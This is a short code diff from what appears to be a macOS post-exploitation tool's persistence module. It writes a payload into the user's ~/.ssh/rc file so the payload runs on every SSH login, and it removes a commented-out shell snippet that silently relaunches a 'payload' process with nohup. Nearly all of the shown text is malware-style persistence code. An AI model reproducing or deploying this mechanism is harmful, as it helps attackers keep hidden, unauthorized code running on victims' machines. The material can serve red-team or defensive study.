@@ -81,15 +81,6 @@ fi`
 
         } else {
 
-           # var payload =
-           #     `RUNNING=$(ps ax | grep osascript | wc -l);
-#if [ "$RUNNING" -lt 2 ]
-#then
-#	setopt LOCAL_OPTIONS NO_MONITOR; nohup payload > /dev/null 2>&1&
-#else
- # setopt LOCAL_OPTIONS NO_MONITOR; exit > /dev/null 2>&1&
-#fi`
-
                 profilePath = userHome + '/.ssh/rc'
 
                 var payload = 
@@ -106,7 +97,7 @@ fi`
                 writeTextToFile(updatedPayload, profilePath, false)
                 output += "Persistence installed at " + userHome + '/.ssh/rc'
             }
-        }
+        
     } catch (error) {
         output += error.toString()
     }
